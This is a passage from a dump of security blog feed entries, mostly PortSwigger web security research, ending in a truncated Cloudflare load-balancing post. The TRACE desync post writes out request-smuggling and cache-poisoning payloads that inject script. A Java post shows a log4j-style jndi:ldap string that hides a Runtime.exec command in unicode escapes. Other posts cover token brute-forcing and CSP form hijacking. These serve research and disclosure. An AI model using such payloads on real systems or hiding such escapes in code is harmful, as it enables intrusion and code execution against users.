0;\n}\nString lookFor = \"HTTP_\";\nreturn utilities().byteUtils().countMatches(requestResponse.response().body().getBytes(), lookFor.getBytes());\nMaybe next time", "timestamp": "2025-10-21T13:33:23.705991"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Introducing SignSaboteur: forge signed web tokens with ease", "url": "https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease", "published": "Wed, 22 May 2024 12:37:00 GMT", "content": "Published: 22 May 2024 at 12:37 UTC\nUpdated: 04 June 2024 at 07:25 UTC\nSigned web tokens are widely used for stateless authentication and authorization\nthroughout the web. The most popular format is JSON Web Tokens (JWT) which we've already covered in depth, but beyond that a diverse ecosystem of\nstandards thrives, each with its own implementation of data storage and security.\nTo help assess these, we've released a new open source extension for Burp Suite called SignSaboteur. This tool is designed to automate the attacks discussed here, ensuring that you no longer overlook any insecure configurations.\nSignSaboteur is a Burp Suite extension for editing, signing, verifying, and attacking signed tokens. It supports different types of tokens, including Django, Flask, and Express.\nThe extension provides automatic detection and in-line editing of tokens within HTTP request / response pairs and WebSocket messages, signing of tokens and automation of brute force attacks.\nSignSaboteur includes its own prebuilt word lists for known default secret keys and salts. You can extend them with your dictionary. JSON encoded strings are supported too, so you can include even non ASCII secrets keys. You can also save known keys for future brute force attacks.\nYou can modify the signed tokens in the Proxy and Repeater message editors. There are a number of built-in handy editors for JSON, timestamps and HEX strings.\nBut the true power of the tool is the unknown signed strings mode - more on that later.\nTo exploit a signed token, you usually need to discover the secret key. These may be disclosed in source code, configuration files, documentation pages, and error messages.\nThese papers provide a good overview of the different attacks:\nTo detect and exploit signed web tokens, we recommend the following methodology:\nBrute force attacks are configured for each type of signed token. SignSaboteur enables you to use different strategies to find the secret key and salt:\nAs soon as you've identified the secret key, you can use the extension to run a number of authorization bypass attacks. All of these attacks can be used together:\nFirst you need to install SignSaboteur in Burp Suite. Do this from the BApp Store under the Extensions tab. Of course you can also build the extension from source code.\nTo use the extension, open any HTTP request / response pair with a signed web token, then go to the SignSaboteur tab. Messages that include signed web tokens are automatically highlighted in the Proxy > HTTP history tab.\nIn the SignSaboteur tab, you can view all signed web tokens that are identified by the extension. These appear in the Token dropdown. Each web signed token’s type supports the fast brute force attack mode. That mode uses known message and derivation methods only.\nIf the extension finds a secret key and salt, you'll see a new secret key dialog. You can use known keys for future attacks. To do so, click Brute Force > Known keys or click Attack and select the key from the Signing keys dropdown.\nTo change keys, go to the SignSaboteur > Wordlist tab.\nYou can configure the search strategy to suit your preferences in the SignSaboteur > Settings tab. A list of all supported tokens is available for your reference. Please note that some tokens are disabled by default to help reduce noise.\nWhen you select Unknown in the Enabled signers menu, the extension looks for patterns that match the size of common hashing functions. Some message payloads might be incorrectly identified by the SignSaboteur. You can manually change message and separator values to solve the issue. The extension supports different message and key derivation techniques with Brute Force attacks, so you don’t have to manually change them.\nTo find the secret key of an unknown signed token, go to the Unknown tab, click Brute force and choose from Balanced or Deep mode.\nA word of caution, the deep brute force mode supports slow hashing functions like Password-Based Key Derivation Function 2. Use it with small wordlists only, otherwise the task will take too long.\nThis short GIF demonstrates how to find the unknown secret key of a Flask test application, modify the session token, and re-sign it.\nYou can try the extension in action on a self hosted lab available at Github repository. Good luck and have fun!", "timestamp": "2025-10-21T13:33:24.772299"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Making desync attacks easy with TRACE", "url": "https://portswigger.net/research/trace-desync-attack", "published": "Tue, 19 Mar 2024 14:00:00 GMT", "content": "Published: 19 March 2024 at 14:00 UTC\nUpdated: 19 June 2024 at 13:58 UTC\nHave you ever found an HTTP desync vulnerability that seemed impossible to exploit due to its complicated constraints? In this blogpost we will explore a new exploitation technique that can be used to completely compromise a web application using TRACE - an ancient HTTP method that's more widely supported than you might think.\nI recently came across an HTTP/2 Desync vulnerability (a.k.a HTTP request smuggling) in a Bug Bounty program that had some HTTP/2 header injection issues. Specifically, it was possible to inject a line break character in a header’s value, letting me smuggle transfer-encoding header which would eventually split the request at backend.\nAfter confirming the vulnerability and submitting it to the program, I received the following message:\n“ Thank you for your submission. Being able to smuggle a request is not a vulnerability in itself. How are you able to exploit the smuggling request? .”\nAlthough saying that smuggling a request is not a vulnerability by itself seems like a bold statement in 2024, I was confident enough I could craft a good Proof of Concept to demonstrate impact.\nBut after looking at the application for a few hours I started worrying, as there was no endpoint I could use to create my payload. There were no other vulnerabilities to leverage with request smuggling, nor reflected parameters that could be used with response smuggling, and even worse, the connections between the frontend and backend appeared to be isolated from each other so I couldn't directly attack other users. I was able to use a HEAD smuggled request to split messages in the response queue, but besides that, this host seemed to be unexploitable.\nAt that moment I noticed something interesting. The backend server was configured to respond to TRACE requests.\nFor those unfamiliar with this method, the HTTP RFC states:\n\"The TRACE method requests a remote, application-level loop-back of the request message. The final recipient of the request SHOULD reflect the message received…”\nThis means that if we send a request like:\nTRACE / HTTP/1.1\nHost: vulnerable.com\nSomeHeader: <script>alert(“reflected”)</script>\nWe would obtain a response with the same request in the body, and with “message/http” as the content-type:\nHTTP/1.1 200 OK\nContent-Type: message/http\nContent-Length: 125\nTRACE / HTTP/1.1\nHost: vulnerable.com\nSomeHeader: <script>alert(“reflected”)</script>\nX-Forwarded-For: xxx.xxx.xxx.xxx\nEven though you might think that the TRACE method is not really used in modern systems, some of the most popular web servers have this feature active by default and need to be disabled explicitly. Servers like Apache and many Microsoft IIS and Tomcat versions will respond to TRACE requests if no custom configuration is applied.\nTRACE request can be really helpful when analysing a smuggling vulnerability. That’s because the response will show us exactly what is being received by the backend.\nBeing able to see the forwarded request can give information about headers that are modified or added (like the X-Forwarded-For header) by the proxy and even protocol modifications, such as downgrading from HTTP/2 to HTTP/1.1, which is the source of many desync vulnerabilities.\nBut what’s even more interesting is that we can use the TRACE response to build a payload to completely compromise the application, by combining it with Response Smuggling and Web Cache Poisoning. Let's see how:\nFor those unfamiliar with Response Concatenation, the basic idea is to smuggle a HEAD request which will produce a response containing only headers. According to the HTTP RFC, this response can contain a content-length header which must have the same value that the GET response would have. This header should be ignored by a proxy when the response is matched to the HEAD request.\nHowever, as the HEAD message was smuggled and the proxy never noticed this, the content-length will not be ignored, causing a concatenation with the next available response.\nAs an example, consider the following request which is used to exploit a server vulnerable to CL.0 desynchronization:\nGET / HTTP/1.1\nHost: vulnerable.com\nContent-Length: 108\nHEAD / HTTP/1.1\nHost: vulnerable.com\nGET /reflect?value=myReflectedString HTTP/1.1\nHost: vulnerable.com\nThe first response will be forwarded to the attacker as usual.\nBut, as the proxy never saw a HEAD request, it will parse the content-length of the next response as it would normally do, using the next response as part of the body.\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 82\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 17\nmyReflectedString\nUsing this technique, an attacker can concatenate responses, using headers as body and modifying the behaviour of a message, by changing the content-type of a payload like in the previous example.\nGoing back to the HTTP/2 Desync vulnerability, I had no endpoint that reflected something useful in either the headers or the body of a response. But what about the TRACE request?\nAs TRACE responses will reflect any header that the backend receives, we can use it to generate a malicious script and place it in the body of the HEAD response:\nGET / HTTP/1.1\nHost: vulnerable.com\nContent-Length: 150\nHEAD / HTTP/1.1\nHost: vulnerable.com\nTRACE / HTTP/1.1\nHost: vulnerable.com\nSomeHeader: <script>alert(“reflected”)</script>\nOther: aaaaaa…\nResulting in the following responses:\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 165\nHTTP/1.1 200 OK\nContent-Type: message/http\nContent-Length: 110\nTRACE / HTTP/1.1\nHost: vulnerable.com\nSomeHeader: <script>alert(“reflected”)</script>\nOther: aaaaaa….\nThe response will be forwarded to the next request that arrives through the same connection, taking control of the browser with a malicious JavaScript!\nThis technique, as powerful as it seems, requires the server to respond to TRACE requests, which might seem unlikely in most production environments.\nAs this method should only be used for debugging purposes, it's common for proxies to block these requests using some firewall rule which will return a Forbidden response.\nBut, as smuggling can be used to bypass firewall rules, it is possible to hide a TRACE message from the proxy and deliver it directly to the backend. So even if the method is forbidden, exploitation through desynchronization is still possible.\nSo far I was able to desynchronize the connections to reflect an arbitrary payload in a response. Yet, as the backend connections were isolated from each other, the malicious response will only be received by the user who issued it.\nEven when connections are not shared between users, there are two techniques that can be used to exploit this condition: Web Cache Poisoning and Client-Side Desync.\nIn this case, Client-Side desync was out of the table (HTTP/2 injection was required), but the application was storing static responses in the cache, which meant that Web Cache Poisoning was possible.\nUsing Response Concatenation, it is possible to choose a response that contains a Content-Length and Cache-Control headers that forces the response to be stored in the cache.\nEven though I was able to find many potential candidate endpoints, none of them had a Content-Type header with value text/html. This means that even if I was able to store my payload with one of these responses, the browser would not execute my malicious Javascript.\nAt that point I could have just sent the desync attack first, followed by a request to a static resource like “/payload.css” through the same HTTP/2 connection and store the response for that endpoint. Anyone requesting for “/payload.css” would receive the evil payload from the cache and the javascript would be executed.\nAlthough this attack might have worked, to affect a user it was necessary to overwrite the cached response of an existing resource, and depending on how the page is loaded and the max-age of the response, it could be quite hard to effectively exploit a victim’s browser.\nStill, there was a better option. When I researched response smuggling I theorised a case in which the attacker could split a response in order to create an arbitrary message that would be stored in cache.\nFor this to be possible it is necessary that the application allows some content reflection which includes line breaks, so that the attacker can write response headers as well as the payload:\nGET / HTTP/1.1\nHost: vulnerable.com\nContent-Length: 360\nHEAD /smuggled HTTP/1.1\nHost: vulnerable.com\nPOST /reflect HTTP/1.1\nHost: vulnerable.com\nSOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\\r\\n\nContent-Type: text/html\\r\\n\nCache-Control: max-age=1000000\\r\\n\nContent-Length: 44\\r\\n\n\\r\\n\n<script>alert(“arbitrary response”)</script>\nWhich would create the following responses:\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 0\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 165\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 243\nSOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\nContent-Type: text/html\nCache-Control: max-age=1000000\nContent-Length: 50\n<script>alert(“arbitrary response”)</script>\nAs previously explained, the last message will be used to complete the HEAD response, but in this case, only the first 78 bytes will be concatenated.\nIf the remaining bytes do not correspond to a valid HTTP message, the proxy would forward a 500 error message or just close the connection after forwarding the previous response.\nBut, in that case, the proxy is able to correctly parse the remaining payload as a valid HTTP response. For that reason, the message will be forwarded as the response of the next available request.\nBy this, the attacker was able to generate an arbitrary response including headers and body, that will be stored in the cache for the URL specified in a following request.\nFinding an endpoint that allows us to reflect any byte sent in the body is extremely rare, but if TRACE requests are permitted, the attack is completely practical.\nNote that, depending on the configuration, TRACE requests cannot contain a content-length header bigger than 0, and therefore is not possible to add the Javascript payload in the same request. We can add an extra response that generates the body of the payload using the same technique described above.\nSome servers like Apache will allow a body If the “TraceEnabled extended” directive is present, which makes the attack even more simple.\nIf the body is not allowed, the message length header can be added using a smuggled transfer-encoding or with an extra response which will be appended right after the last header of the TRACE message:\nGET / HTTP/1.1\nHost: vulnerable.com\nContent-Length: 268\nHEAD /smuggled HTTP/1.1\nHost: vulnerable.com\nTRACE / HTTP/1.1\nHost: vulnerable.com\nA: HTTP/1.1 200 Ok\nCache-Control: max-age=1000000\nHEAD /smuggled HTTP/1.1\nHost: vulnerable.com\nTRACE / HTTP/1.1\nHost: vulnerable.com\nA: <script>alert(“XSS”)</script>\nWhich would generate the following responses\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 0\nHTTP/1.1 200 Ok\nContent-Type: text/html\nContent-Length: 165\nHTTP/1.1 200 Ok\nContent-Type: message/http\nContent-Length: 150\nTRACE / HTTP/1.1\nHost: vulnerable.com\nPadding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nA: HTTP/1.1 200 OK\nCache-Control: max-age=1000000\nB: HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 165\nHTTP/1.1 200 Ok\nContent-Type: message/http\nContent-Length: 79\nTRACE / HTTP/1.1\nHost: vulnerable.com\nA: <script>alert(“Arbitrary XSS”)</script>\nIf the TRACE implementation makes it impossible to append a message-length header in the response, it is also possible to create a redirect response that will be stored in the cache. This can either redirect to a stored payload (using the cache deception/poisoning technique), or to an attacker’s page to launch another attack like client-side desync or classic phishing.\nIn summary, this case shows how using forgotten methods like TRACE, combined with modern techniques such as HTTP Desync and Cache Poisoning, can lead to serious security issues in web applications. Even though TRACE is an old method, it proves to be very effective for attackers who know how to use it creatively.\nThis reminds us that we should never underestimate older technologies, as they can be used in new ways to create significant challenges for cybersecurity.", "timestamp": "2025-10-21T13:33:25.859594"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Using form hijacking to bypass CSP", "url": "https://portswigger.net/research/using-form-hijacking-to-bypass-csp", "published": "Tue, 05 Mar 2024 14:55:00 GMT", "content": "Published: 05 March 2024 at 14:55 UTC\nUpdated: 05 March 2024 at 14:55 UTC\nIn this post we'll show you how to bypass CSP by using an often overlooked technique that can enable password theft in a seemingly secure configuration.\nForm hijacking isn't really a widely known technique; the idea is you have a HTML injection vulnerability that is protected by CSP. Then you use the HTML injection to inject your own form action by using the formaction\nattribute or injecting your own form to send data to the attackers server. Over eager password managers will also help fill in credentials with injected input elements making the attack pretty serious.\nWe found a real world example of this on Infosec Mastodon where they used a fork of Mastodon that didn't filter HTML correctly. An attacker could then use form hijacking to send credentials to their server after Chrome's password manager had automatically filled them in. The end result was a user would see a post in Infosec Mastodon, click what looked like part of the interface but actually would send the user's credentials to an attacker's server.\nThat was over a year ago and then...we got an excellent report submitted by Johan Carlsson to our very own bug bounty program. In the report he showed how we allowlisted some Google script resources and he could use that to bypass CSP by injecting AngularJS. After we fixed that he also pointed out that we didn't protect against form hijacking! Thankfully, this was just a bypass of our CSP as we didn't have a HTML injection vulnerability but it was good to receive a report that hardened our security so we gave him a $1,500 bounty.\nThe form-action directive was specified in version 2 of CSP. Unfortunately, default-src does not cover form actions. This means if you overlook this directive then your CSP will be vulnerable to form hijacking and this is exactly what happened in the case of the Infosec Mastodon and even our own site. Therefore this post was meant to spread awareness of this issue and hopefully harden many CSP's out there.\nWe've recently released some new passive scan checks for CSP issues in Burp. These checks will find issues like form hijacking, allowlisted resources, untrusted script execution, untrusted style execution, malformed syntax, clickjacking and non-enforced CSP. I'll go through each one so you can understand how to fix these issues if you encounter them.\nIf you don't use form actions on your site (which is pretty common these days in modern apps) you can specify the directive with the 'none' keyword, this is the safest configuration since an attacker won't be able to post forms to an external location. If your site requires \"same site\" form actions then you can use the 'self' keyword. Lastly if you want to allow an external location you can specify a URL but bear in mind that an attacker will be able to post to that location too if they find a HTML injection vulnerability. Examples of each configuration are given below:\nContent-Security-Policy: form-action 'none'\nContent-Security-Policy: form-action 'self'\nContent-Security-Policy: form-action https://portswigger.net\nIt's bad practice to use allowlisted URLs because they can be used to for script gadgets . This scan check will look at the script directives and see if any domains are allowlisted. To fix this you are advised to use a secure random nonce to protect your scripts:\nContent-Security-Policy: script-src 'nonce-RANDOM';\nThis issue points out when you use 'unsafe-inline' in your script directives. As the name suggests this opens your policy up to cross site scripting attacks because you can inject an inline script tag. It also covers when the policy allows wildcard domains, data: URLs, unsafe-eval and weak nonce randomisation. Secure random nonces are the best way to resolve this issue:\nContent-Security-Policy: script-src 'nonce-RANDOM';\nStyle based injections can often have a significant impact if there is sensitive information or tokens on the page. This issue points out if you use 'unsafe-inline' in conjunction with style based directives. Any wildcard domains, data: URLs and weak nonce randomisation will also be reported. To fix this again use nonces in your style directives:\nContent-Security-Policy: style-src 'nonce-RANDOM';\nWhen CSP encounters some malformed syntax it will ignore the value or maybe even the directive. This scan check looks for malformed CSP syntax and reports any directives or values that do not conform to the specification. We ran a scan on a large number of sites and found lots of common mistakes that this scan check will help iron out. When some invalid syntax is found the directive or value will be displayed in the issue detail. To fix this you should consult the CSP specification and ensure the syntax is correct.\nThis check will check X-Frame-Options and the frame-ancesters directive in CSP and inform you if your application allows it to be framed. X-Frame-Options is now deprecated so we recommend you use the frame-ancestors directive to mitigate clickjacking attacks like this:\nContent-Security-Policy: frame-ancestors 'none';\nBurp will also inform you if your policy is in report only mode, this means the policy won't be enforced but will log the results. This is often used to transition to an enforced policy but can often be overlooked by mistake. It will also report an issue on a per site basis if CSP does not exist to encourage developers to deploy one.\nWhilst testing Burp we scanned our bug bounty pipeline and found lots of common mistakes that developers make when deploying CSP. We are going to highlight some of them below to help you avoid them.\nSome web sites forget the colon quite a lot when deploying.\nContent-Security-Policy: script-src 'self' https\nIt should be:\nContent-Security-Policy: script-src 'self' https:\nYou should avoid doing this of course because an attacker would be able to inject a script resource from any domain with TLS provided the target site is vulnerable to XSS.\nIt's quite common to forget to include a semicolon. This can result in the directive name being used as a value which would mean the policy wouldn't enforce this directive!\nThis is incorrect:\nframe-ancestors 'self' https://example.com default-src 'none'\nIt should be:\nframe-ancestors 'self' https://example.com; default-src 'none'\nIn CSP all special directive values are quoted. It's quite common to see values not quoted and also illegal values like the following:\nContent-Security-Policy: frame-ancestors DENY\nThere is no DENY value in the frame-ancestors directive value. It should be:\nContent-Security-Policy: frame-ancestors 'none'\nA lot of sites also forget to include quotes around hashes or nonces. I think this is quite common because traditionally special values are quoted whereas non keywords are not. So it's quite understandable that they get confused:\nThis is incorrect:\nContent-Security-Policy: script-src sha512-BASE64HASH\nIt should be:\nContent-Security-Policy: script-src 'sha512-BASE64HASH'\nWe hope that this post spreads awareness of form hijacking and common CSP mistakes. If you want to scan your own site for these issues you can get Burp on the early adopter channel. Happy hunting!", "timestamp": "2025-10-21T13:33:26.767604"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Top 10 web hacking techniques of 2023", "url": "https://portswigger.net/research/top-10-web-hacking-techniques-of-2023", "published": "Mon, 19 Feb 2024 14:31:12 GMT", "content": "Published: 19 February 2024 at 14:31 UTC\nUpdated: 19 February 2024 at 15:58 UTC\nWelcome to the Top 10 Web Hacking Techniques of 2023, the 17th edition of our annual community-powered effort to identify the most innovative must-read web security research published in the last year.\nThis year, in response to our call for nominations the community submitted a record 68 entries, and cast votes to select 15 finalists. The finalists were then analysed over two weeks and voted on by an expert panel of researchers Nicolas Grégoire, Soroush Dalili, Filedescriptor, and myself to select the top ten new web hacking techniques of 2023! As usual, we haven't excluded our own research, but panellists can't vote for anything they're affiliated with.\nThe standard of competition has once again been extremely fierce, with many posts I personally rate failing to even survive the community vote. I highly recommend that everyone with time to spare peruse the entire nomination list, and we've added AI-generated summaries for every entry to help you evaluate which ones to dive into.\nWith all that said, let's start the countdown!\nIn tenth place, we have a beautiful insight into some overlooked and incredibly valuable attack-surface. In can I speak to your manager? hacking root EPP servers to take control of zones, Sam Curry, Brett Buerhaus, Rhys Elsmore, and Shubham Shah give us a timeless lesson that critical internet infrastructure can be shockingly fragile, and the easiest route to hack something might be many layers away.\nIn ninth, Cookie Crumbles: Breaking and Fixing Web Session Integrity takes a harsh look at the state of web cookies from numerous angles. One standout technique is CSRF token fixation - a cousin of session fixation, which they use to exploit numerous authentication libraries, notably including popular PHP framework Symfony. If you want to perform a CSRF attack in 2024, read this paper. Excellent work from Marco Squarcina, Pedro Adão, Lorenzo Veronese and Matteo Maffei.\nIn eighth place, From Akamai to F5 to NTLM... with love offers proof that HTTP Desync Attacks still haunt the internet. D3d's deadvolvo's work stands out thanks to a rich exploration of the research thought process, sharing the whole journey and capturing the sheer scope and impact of this bug class. Both vulnerable server vendors refuse to pay bounties, and instead rely on their exposed customers paying out bounties to incentivize this kind of research, which creates some interesting dynamics. Best not to think about it.\nHow I Hacked Microsoft Teams takes you through the conception and development of a $150,000 exploit chain. This presentation by Masato Kinugawa is meticulously crafted to let the reader rediscover the exploit themselves, so I won't spoil it by describing the techniques involved. Rather than introducing a novel class of attack, it's a holistic insight into his innovative approach to bypassing protections. I'd recommend everyone read it, but it's particularly worth reading if you want to find non-trivial bugs in Electron applications.\nIt's easy to under-estimate the scope of HTTP Request Splitting because frankly, it shouldn't exist in any mainstream server in 2023. However, nginx apparently thinks otherwise, making this vulnerability a common and high-impact goldmine for hackers. In HTTP Request Splitting vulnerabilities exploitation, Sergey Bobrov provides a broad range of case-studies showing creative pathways to maximum impact. You can expect this to remain valuable until nginx changes their position, or HTTP/1.1 fades out of existence. I'll write them an email.\nIn fifth place, Exploiting HTTP Parsers Inconsistencies by Rafael da Costa Santos takes familiar parser confusion techniques and reapplies them in new contexts, discovering ACL bypasses, SSRF, cache poisoning, and of course WAF bypasses. It takes serious skill to make research look this easy.\nIn 2022, hash_kitten invented an extremely creative technique to leak the contents of files by repeatedly using PHP filters to trigger conditional out-of-memory exceptions, but the community struggled to replicate it and the technique largely escaped attention. In PHP filter chains: file read from error-based oracle, Rémi Matasse gives this amazing technique the in-depth explanation, optimisations, and accompanying toolkit that it so badly deserves. This technique is fascinating and we're intrigued to see if it gets taken further in PHP or other languages.\nIn well-earned third place comes SMTP Smuggling - Spoofing E-Mails Worldwide by Timo Longin. This research continues the parser discrepancy storm by adapting HTTP request smuggling techniques to exploit SMTP instead. It contains all the hallmarks of outstanding research: innovative ideas, high-impact case-studies targeting well-known software, in-depth explanations, tools, and ample potential for further research. We think it could serve as a solid foundation for identifying smuggling issues in different protocols or even for discovering additional techniques within SMTP itself. It also offers a clear lesson; if you're using a text-based protocol with multiple parsers, beware!\nMassive congrats to Timo Longin and SEC Consult for this contribution to internet security!\nExploiting Hardened .NET Deserialization by Piotr Bazydło provides an absolute deserialization masterclass. The introduction lays out the goal: \"show that targets that appear not to be exploitable, may be in fact vulnerable\". The subsequent 100 pages achieve it. Invest your time in these pages and they will reward you by destroying any faith you might have had in blocklist-based deserialization mitigations, and equipping you with the means to personally get that RCE. It's available as a conference presentation too. Highlights for the panel included the beautiful gadgets CredentialIntializer and SettingsPropertyValue, and the insecure serialization attack on the the deserialize->serialize pattern.\nThis is an outstanding contribution to the community from Piotr Bazydło and Trend Micro ZDI - awesome work!\nWell, this is awkward. I always knew there was a risk to rating research when I also publish it myself, and after seven years it's happened - I now have to declare that my own research is the best. Next year I'm going to figure out a strategy for reclaiming some resemblance of integrity but for now, let's hear from the rest of the panel:\nIn recent years, there was not much to say about web race conditions - testers have a good idea where they are, establish whether they work or not, and move on. Not anymore. Smashing the state machine by James Kettle highlights previously overlooked aspects of race condition attacks in everyday applications. It focuses on the multi-step aspect of race condition attacks to achieve greater impact, and adapts recent techniques abusing the latest HTTP stacks to maximise exploitability. Although executing some of these attacks may prove challenging, I believe this research holds great potential for the future!\n2023 saw the security community publish a huge quantity of quality research, resulting in fierce competition in both the community vote and the panel vote phases.\nThe community engagement is what gives this project spark so if you have opinions about our rankings, or would simply like to share your personal top ten, feel free to post them and tag us on X/Mastodon/LinkedIn. One thing we can all agree on is that any possible selection of ten winners from 78 nominations is going to leave a lot of good techniques behind so it's well worth revisiting the nomination list too!\nPart of what lands an entry in the top 10 is its expected longevity, so it's well worth getting caught up with past year's top 10s too. If you're interested in getting a preview of what might win from 2024, you can subscribe to our RSS, join r/websecurityresearch, or follow us on social. If you're interested in doing this kind of research yourself, I've shared a few lessons I've learned over the years in Hunting Evasive Vulnerabilities, and So you want to be a web security researcher?\nThanks again to everyone who took part! Without your nominations, votes, and most-importantly research, this wouldn't be possible.\nTill next time!", "timestamp": "2025-10-21T13:33:27.689526"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Hiding payloads in Java source code strings", "url": "https://portswigger.net/research/hiding-payloads-in-java-source-code-strings", "published": "Tue, 23 Jan 2024 15:00:00 GMT", "content": "Published: 23 January 2024 at 15:00 UTC\nUpdated: 24 January 2024 at 12:27 UTC\nIn this post we'll show you how Java handles unicode escapes in source code strings in a way you might find surprising - and how you can abuse them to conceal payloads.\nWe recently released a powerful new feature called Bambdas . They allow you to filter items in Burp using Java code. But that got us wondering, what if you could convince a user to run a Bambda that looked like an honest exploit payload but actually executed arbitrary code on the local machine?\nWhat do you expect would happen when you use the following in a Bambda:\nvar log4jpayload = \"%24%7Bjndi:ldap://psres.net/\\u0022;Runtime.getRuntime().exec(\\u0022open -a calculator\\u0022);//%7D\";\nIf you were expecting a simple string assignment you'd be wrong. What actually happens is the Java compiler treats the unicode encoded double quote (\\u0022) as a double quote and closes the string. Then Runtime.getRuntime() is executed along with the command passed with an encoded string. Java pretty much allows you to encode the entire syntax with unicode escapes!\nWe couldn't find this technique publicly documented anywhere, but if you liked this you can find a bunch of related attacks in this paper .\nRemember a Bambda allows arbitrary code execution so when using one from an untrusted source make sure you validate it before using it!", "timestamp": "2025-10-21T13:33:28.500442"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Load Balancing Monitor Groups: Multi-Service Health Checks for Resilient Applications", "url": "https://blog.cloudflare.com/load-balancing-monitor-groups-multi-service-health-checks-for-resilient/", "published": "Fri, 17 Oct 2025 06:00:00 GMT", "content": "Load Balancing Monitor Groups: Multi-Service Health Checks for Resilient Applications2025-10-17Noah CrouchCole Bennett5 min readModern applications are not monoliths. They are complex, distributed systems where availability depends on multiple independent components working in harmony. A web server might be running, but if its connection to the database is down or the authentication service is unresponsive, the application as a whole is unhealthy. Relying on a single health check is like knowing the “check engine” light is not on, but not knowing that one of your tires has a puncture. It’s great your engine is going, but you’re probably not driving far.As applications grow in complexity, so does the definition of \"healthy.\" We've heard from customers, big and small, that they need to validate multiple services to consider an endpoint ready to receive traffic. For example, they may need to confirm that an underlying API gateway is healthy and that a specific ‘/login’ service is responsive before routing users there. Until now, this required building custom, synthetic services to aggregate these checks, adding operational overhead and another potential point of failure.Today, we are introducing Monitor Groups for Cloudflare Load Balancing. This feature provides a new way to create sophisticated, multi-service health assessments directly on our platform. With Monitor Groups, you can bundle multiple health monitors into a single logical entity, define which components are critical, and use an aggregated health score to make more intelligent and resilient failover decisions.This new capability, available via the API for our Enterprise customers, removes the need for custom health aggregation services and provides a far more accurate picture of your application’s true availability. In the near future this feature will be available in the Dashboard for all Load Balancing users, not just Enterprise! How Monitor Groups Work Monitor Groups function as a superset of monitors. Once you have created your monitors they can be bundled into a single unit – the Monitor Group! When you attach a Monitor Group to an endpoint pool, the health of each endpoint in that pool is determined by aggregating the results of all enabled monitors within the group. These settings, defined within the ‘members’ array of a monitor group, give you granular control over how the collective health is determined. // Structure for a single monitor within a group { \"description\": \"Test Monitor Group\", \"members\": [ { \"monitor_id\": \"string\", \"enabled\": true, \"monitoring_only\": false, \"must_be_healthy\": true }, { \"monitor_id\": \"string\", \"enabled\": true, \"monitoring_only\": false, \"must_be_healthy\": true } ] } Here’s what each property does:Critical Monitors (must_be_healthy): You can designate a monitor as critical. If a monitor with this setting fails its health check against an endpoint, that endpoint is immediately marked as unhealthy. This provides a definitive override for essential services, regardless of the status of other monitors in the group.Observational Probes (monitoring_only): Mark a monitor as \"monitoring only\" to receive alerts and data without it affecting a pool's health status or traffic steering. This is perfect for testing new checks or observing non-critical dependencies without impacting production traffic.Quorum-Based Health: In the absence of a failure from a critical monitor, an endpoint's health is determined by a quorum of all other active monitors. An endpoint is considered globally unhealthy only if more than 50% of its assigned monitors report it as unhealthy. This system prevents an endpoint from being prematurely marked as unhealthy due to a transient failure from a single, non-critical monitor.You can add up to five monitors to a group. A diagram showing three health monitors (HTTP, TCP, and Database) combined into a single Monitor Group. The group is attached to a Cloudflare Load Balancing pool, which assesses the health of three origin servers. A Globally Distributed Perspective The power of Monitor Groups is amplified by the scale of Cloudflare’s global network. Health checks aren't performed from a handful of static locations; they can be configured to execute from data centers in over 300 cities across the globe. While you can configure monitoring from every data center simultaneously ('All Datacenters' mode), we recommend a more targeted approach for most applications. Choosing a few diverse regions, like Western North America and Eastern Europe, or using the 'All Regions' setting provides a robust, global perspective on your application's health while reducing the volume of health monitoring traffic sent to your origins. This creates a distributed consensus on application health, preventing a localized network issue from triggering a false positive and causing an unnecessary global failover. Your application’s health is determined not by a single perspective, but by a global one. This same principle elevates Dynamic Steering when used in conjunction with Monitor Groups. The latency for a Monitor Group isn't just a single RTT measurement. It's a holistic performance score, averaged from, potentially, hundreds of points of presence, across all the critical services you’ve defined. This means your load balancer steers traffic based on a true, globally-aware understanding of your application’s performance.For load balancers using Dynamic Steering and a Monitor Group, the latency used to make steering decisions is now calculated as the average Round Trip Time (RTT) of all active, non-monitoring-only members in the group. This provides a more stable and representative performance metric. Rather than relying on the latency of a single service, Dynamic Steering can now make decisions based on the collective performance of all critical components, ensuring traffic is sent to the endpoint that is truly the most performant overall. Health Aggregation in Action Let's walk through an example to see how Cloudflare aggregates health signals from a Monitor Group to determine the overall health of a single endpoint. In this scenario, our application has three key components we need to check: a public-facing /health endpoint, another service running on a specific TCP port, and a database dependency. Privacy and security are paramount, so, to monitor the database without exposing it to the public Internet, you would securely connect it to Cloudflare using a Cloudflare Tunnel, allowing our health checks to reach it securely. Setup Health Monitors in the Group:HTTP check for /health (must_be_healthy: true)TCP check for Port 3000 connectivity (must_be_healthy: false)DB check for database health (must_be_healthy: false)Health Check Regions:Western North America (3 data centers)Eastern North America (3 data centers)Quorum Threshold: An endpoint is considered healthy if more than 50% of checking data centers report it as UP.First, Cloudflare determines the health from the perspective of each individual data center. If the critical monitor fails, that data center’s result is definitively DOWN. Otherwise, the result is based on the majority status of the remaining monitors.Here are the results from our six data centers: [image description: A table showing health check results from six data centers across two regions. One of the six data centers report a \"DOWN\" status because the critical HTTP monitor failed. The other five report \"UP\" because the 